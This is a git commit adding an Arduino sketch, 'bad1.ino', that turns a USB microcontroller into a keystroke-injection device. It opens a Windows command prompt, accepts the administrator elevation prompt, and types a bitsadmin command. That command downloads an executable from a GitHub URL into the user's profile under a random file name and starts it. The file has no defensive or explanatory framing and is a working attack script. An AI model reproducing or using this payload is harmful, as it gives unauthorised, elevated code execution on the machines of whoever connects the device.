f35c5a19c01a58c5ab4fc954e0d8fbc7163098c6
Peter <50012961+jitterxie@users.noreply.github.com>
2020-10-09 02:41:58 -0700

    Add files via upload

---
+++ bad1.ino
@@ -0,0 +1,34 @@
+
+#include <Keyboard.h>
+void setup() { 
+    delay(1000);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(500);
+    Keyboard.print("cmd");
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(KEY_LEFT_SHIFT);
+    Keyboard.press(KEY_RETURN);
+    delay(500);
+    Keyboard.releaseAll();
+    delay(500);
+    Keyboard.press(KEY_LEFT_ARROW);
+    Keyboard.release(KEY_LEFT_ARROW);
+    delay(200);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();  
+    delay(500);
+    Keyboard.print("cmd.exe /c bitsadmin /transfer eH /priority foreground https://github.com/jitterxie/JJY.exe/raw/master/JJY.exe %USERPROFILE%\cXUAQSZZXXCXzx.exe && start %USERPROFILE%\cXUAQSZZXXCXzx.exe");
+    
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(500);
+    Keyboard.end();
+ }
+
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
